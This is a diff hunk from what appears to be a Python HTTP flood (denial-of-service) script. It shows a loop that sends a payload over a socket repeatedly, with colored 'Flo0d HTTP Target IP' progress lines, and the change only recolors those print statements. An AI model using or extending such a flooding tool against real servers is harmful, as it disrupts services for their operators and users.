@@ -73,8 +73,8 @@ def start():
       for i in range(packs):
         s.send(r)
         u += 1
-        print("\033[32m[" +str(u)+ "]  \033[32mFlo0d\033[1;32mHTTP  \033[31mTarget\033[37mIP\033[1;35m::: \033[0;37m" +ip+ "  \033[0m")
-        print("\033[34m[" +str(u)+ "]  \033[33mFl0od\033[31mHTTP  \033[33mTarget\033[94mIP\033[0;33m::: \033[1;36m" +ip+ "  \033[0m")
+        print("\033[32m[" +str(u)+ "]  \033[32mFlo0d\033[33mHTTP  \033[31mTarget\033[37mIP\033[1;35m::: \033[0;37m" +ip+ "  \033[0m")
+        print("\033[34m[" +str(u)+ "]  \033[31mFl0od\033[92mHTTP  \033[33mTarget\033[94mIP\033[0;33m::: \033[1;37m" +ip+ "  \033[0m")
         
     except:
         s.close()
